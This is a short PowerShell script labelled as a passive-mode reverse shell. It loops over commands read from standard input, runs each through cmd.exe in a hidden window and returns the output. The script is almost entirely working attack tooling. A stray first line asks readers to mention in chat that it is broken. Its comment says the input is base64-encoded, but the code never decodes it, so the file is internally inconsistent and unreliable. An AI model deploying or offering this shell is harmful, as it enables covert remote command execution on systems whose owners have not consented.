#THIS RAW IS NOT WORKING PROPERLY WITH TEMPLATE IF YOU SEE THIS MENTION IN CHAT


# Reverse shell (passive mode) — executed via Add-Type wrapper
# This script assumes input is a base64-encoded command, separated by \n

while ($true) {
    try {
        $line = [Console]::In.ReadLine()
        if ($line -eq $null -or $line.Trim() -eq "exit") { break }

        $proc = New-Object System.Diagnostics.Process
        $proc.StartInfo.FileName = "cmd.exe"
        $proc.StartInfo.Arguments = "/c " + $line
        $proc.StartInfo.RedirectStandardOutput = $true
        $proc.StartInfo.UseShellExecute = $false
        $proc.StartInfo.CreateNoWindow = $true
        $proc.Start() | Out-Null
        $output = $proc.StandardOutput.ReadToEnd()
        $proc.WaitForExit()

        [Console]::Out.WriteLine($output)
    } catch {
        [Console]::Out.WriteLine($_.Exception.Message)
    }
}
